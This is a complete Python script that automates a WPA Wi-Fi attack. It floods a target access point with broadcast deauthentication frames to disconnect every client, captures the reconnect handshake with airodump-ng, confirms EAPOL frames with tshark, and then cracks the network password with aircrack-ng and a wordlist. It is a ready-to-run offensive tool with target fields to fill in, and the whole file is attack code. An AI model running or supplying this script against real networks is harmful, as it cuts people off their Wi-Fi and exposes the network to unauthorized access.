import subprocess
import sys
import time
import os
import glob
import threading

# --- Import Scapy ---
try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf
    conf.verb = 0 # Disable scapy's default verbose output for sendp
except ImportError:
    print("Error: Scapy is not installed. Please install it: pip install scapy")
    sys.exit(1)

# --- Define your variables ---
bssid = "0E:BD:E5:43:62:17"  # <<< Replace with the actual BSSID
channel = "6"  # <<< Replace with the actual channel number (as a string)
interface = "wlan0"  # <<< Replace with your monitor mode interface name
airodump_timeout = 5  # Duration in seconds for each airodump-ng run cycle
deauth_count = 10      # Number of deauth packets to send per burst
deauth_interval = 0.1  # Time (seconds) between deauth bursts
target_mac = "FF:FF:FF:FF:FF:FF" # Target MAC for deauth (broadcast)

# --- Wordlist for Aircrack-ng ---
wordlist = "/home/kali/Desktop/pass.txt" # <<< Path to your wordlist

# --- Create BSSID-specific directory ---
base_capture_dir = "./captures/"
safe_bssid_name = bssid.replace(":", "-")
output_dir = os.path.join(base_capture_dir, safe_bssid_name)
os.makedirs(output_dir, exist_ok=True)
output_prefix = os.path.join(output_dir, "capture")
# airodump-ng usually starts numbering at -01 for .cap files
cap_file = f"{output_prefix}-01.cap"

# --- Thread Synchronization Event ---
stop_event = threading.Event()

# --- Deauthentication Function (for Thread) ---
def deauth_worker(target_bssid, target_client, network_interface, count, interval, stop_signal):
    """Sends deauthentication packets in a loop until stop_signal is set."""
    print(f"[Deauth Thread] Starting deauthentication against BSSID: {target_bssid} on {network_interface}")
    dot11 = Dot11(type=0, subtype=12, addr1=target_client, addr2=target_bssid, addr3=target_bssid)
    deauth_frame_to_client = RadioTap() / dot11 / Dot11Deauth(reason=7)

    while not stop_signal.is_set():
        try:
            # print(f"[Deauth Thread] Sending {count} deauth packets...") # Can be noisy
            sendp(deauth_frame_to_client, iface=network_interface, count=count, inter=0.005, verbose=False)
            stop_signal.wait(interval)
        except OSError as e:
            print(f"[Deauth Thread] Error sending packets: {e}. Stopping deauth.")
            print("[Deauth Thread] Ensure the interface is in monitor mode and up.")
            stop_signal.set()
            break
        except Exception as e:
            print(f"[Deauth Thread] An unexpected error occurred: {e}")
            time.sleep(1)

    print("[Deauth Thread] Stopped.")

# --- Capture and Crack Function (for Thread) ---
def capture_worker(target_bssid, target_channel, network_interface, timeout_duration, capture_prefix, capture_filepath, wordlist_path, stop_signal):
    """Runs airodump-ng, checks for handshake, and attempts crack until stop_signal is set or handshake is cracked."""
    print(f"[Capture Thread] Starting capture for BSSID: {target_bssid} on channel {target_channel}")
    airodump_cmd_list = [
        'sudo', 'airodump-ng',
        '--bssid', target_bssid,
        '--channel', target_channel,
        '-w', capture_prefix,
        network_interface
    ]
    WPA_handshake_captured = False

    while not WPA_handshake_captured and not stop_signal.is_set():
        # --- Clean up old capture files ---
        cleanup_pattern = f"{capture_prefix}*"
        cleanup_command_str = f"sudo rm -f {cleanup_pattern}"
        try:
            subprocess.run(cleanup_command_str, shell=True, check=False, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        except Exception as e:
            print(f"[Capture Thread] Error during cleanup: {e}")

        # --- Run airodump-ng ---
        print(f"[Capture Thread] Running airodump-ng for {timeout_duration} seconds...")
        airodump_process = None
        try:
            airodump_process = subprocess.Popen(airodump_cmd_list, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) # Hide airodump output unless error needed
            # Wait for timeout, checking stop_signal
            start_time = time.monotonic()
            while time.monotonic() - start_time < timeout_duration:
                if stop_signal.wait(timeout=0.2): # Check stop signal every 0.2s
                     print("[Capture Thread] Stop signal received during airodump.")
                     break
            if airodump_process.poll() is None: # If process still running after loop/timeout
                print(f"[Capture Thread] airodump-ng timeout reached ({timeout_duration}s). Checking capture...")
                airodump_process.terminate()
                try:
                    airodump_process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    print("[Capture Thread] airodump-ng did not terminate gracefully, killing.")
                    airodump_process.kill()

        except FileNotFoundError:
            print(f"[Capture Thread] Error: 'airodump-ng' not found. Is aircrack-ng installed?")
            stop_signal.set()
            break
        except Exception as e:
            print(f"[Capture Thread] An unexpected error occurred running airodump-ng: {e}")
            if airodump_process and airodump_process.poll() is None:
                 try:
                     airodump_process.terminate()
                     airodump_process.kill()
                 except: pass # Ignore errors during cleanup kill
            stop_signal.set()
            break
        finally:
             if airodump_process and airodump_process.poll() is None:
                 try:
                     airodump_process.terminate()
                     airodump_process.kill()
                 except: pass

        if stop_signal.is_set():
            break # Exit loop if stopped externally

        # --- Check for Handshake ---
        print(f"[Capture Thread] Checking for handshake in: {capture_filepath}")
        if not os.path.exists(capture_filepath):
            print(f"[Capture Thread] Capture file {capture_filepath} not found. Continuing scan...")
            time.sleep(2)
            continue

        try:
            tshark_command = ["tshark", "-r", capture_filepath, "-Y", "eapol"]
            result = subprocess.run(tshark_command, capture_output=True, text=True, check=True, timeout=20)
            output = result.stdout
            if "EAPOL" in output:
                WPA_handshake_captured = True
                print("[Capture Thread] ********** Handshake captured! **********")
                stop_signal.set() # Signal the deauth thread to stop

                # --- Attempt to Crack Handshake ---
                print(f"[Capture Thread] Attempting to crack {capture_filepath} with wordlist {wordlist_path}...")
                if not os.path.exists(wordlist_path):
                    print(f"[Capture Thread] Error: Wordlist not found at {wordlist_path}")
                    print("[Capture Thread] Cracking skipped.")
                else:
                    aircrack_command = [
                        # Note: aircrack-ng often doesn't need sudo if the script runner can read the cap file
                        # But if script is run with sudo, cap file might be root-owned, so keep sudo for consistency
                        'sudo',
                        'aircrack-ng',
                        '-w', wordlist_path,
                        '-b', target_bssid,
                        capture_filepath
                    ]
                    print(f"[Capture Thread] Running command: {' '.join(aircrack_command)}")
                    try:
                        # Run aircrack and let its output go to console
                        # Use check=False as non-zero exit code might mean "not found" rather than error
                        crack_result = subprocess.run(aircrack_command, check=False, text=True)
                        print(f"[Capture Thread] aircrack-ng finished with exit code {crack_result.returncode}.")
                        # Basic check in output (aircrack specific, might need adjustment)
                        # if crack_result.stdout and "KEY FOUND!" in crack_result.stdout:
                        #     print("[Capture Thread] ---> Password likely found by aircrack-ng! <---")
                        # elif crack_result.returncode == 0:
                        #      print("[Capture Thread] Aircrack completed, but password might not be found in output.")
                        # else:
                        #      print("[Capture Thread] Aircrack completed. Password not found in wordlist or error occurred.")

                    except FileNotFoundError:
                        print("[Capture Thread] Error: 'aircrack-ng' command not found. Is aircrack-ng installed?")
                    except Exception as e:
                        print(f"[Capture Thread] An error occurred during aircrack-ng execution: {e}")
            else:
                print(f"[Capture Thread] No Handshake Found in {capture_filepath}. Retrying scan...")
                time.sleep(3)

        except subprocess.TimeoutExpired:
            print(f"[Capture Thread] tshark timed out checking {capture_filepath}. Retrying scan...")
            time.sleep(2)
        except subprocess.CalledProcessError as e:
            print(f"[Capture Thread] tshark failed checking {capture_filepath}. Error: {e.stderr}. Retrying scan...")
            time.sleep(3)
        except FileNotFoundError:
            print("[Capture Thread] Error: tshark not found. Please install Wireshark/tshark.")
            stop_signal.set()
            break
        except Exception as e:
            print(f"[Capture Thread] An error occurred during tshark check: {e}. Retrying scan...")
            time.sleep(3)

    print("[Capture Thread] Stopped.")
    if WPA_handshake_captured:
        print(f"[Capture Thread] Handshake capture/crack process complete. Files in: {output_dir}")

# --- Main Execution Logic ---
if __name__ == "__main__":
    print("--- Starting WPA Handshake Capture, Deauth, and Crack ---")
    print(f"Target BSSID: {bssid}")
    print(f"Channel: {channel}")
    print(f"Interface: {interface}")
    print(f"Capture Directory: {output_dir}")
    print(f"Wordlist: {wordlist}")
    print("Press Ctrl+C to stop.")

    if not os.path.exists(wordlist):
        print(f"\nWarning: Wordlist not found at '{wordlist}'. Cracking will be skipped if handshake is found.")
        # time.sleep(3) # Optional pause

    # --- Create Threads ---
    capture_thread = threading.Thread(
        target=capture_worker,
        # Pass wordlist path to the capture worker now
        args=(bssid, channel, interface, airodump_timeout, output_prefix, cap_file, wordlist, stop_event),
        daemon=True
    )

    deauth_thread = threading.Thread(
        target=deauth_worker,
        args=(bssid, target_mac, interface, deauth_count, deauth_interval, stop_event),
        daemon=True
    )

    # --- Start Threads ---
    capture_thread.start()
    time.sleep(2)
    deauth_thread.start()

    # --- Wait for threads ---
    try:
        while capture_thread.is_alive():
             capture_thread.join(timeout=0.5)

        stop_event.set() # Ensure deauth stops if capture finishes
        if deauth_thread.is_alive():
            print("[Main Thread] Waiting for deauth thread to finish...")
            deauth_thread.join(timeout=5)

    except KeyboardInterrupt:
        print("\n[Main Thread] Ctrl+C detected! Stopping threads...")
        stop_event.set()
        print("[Main Thread] Waiting for capture thread to exit...")
        capture_thread.join(timeout=10) # Give capture thread time to stop airodump/aircrack
        print("[Main Thread] Waiting for deauth thread to exit...")
        deauth_thread.join(timeout=5)

    print("[Main Thread] All threads stopped. Script finished.")
    if os.path.exists(cap_file):
         print(f"Check capture files and cracking results in console log and directory: {output_dir}")
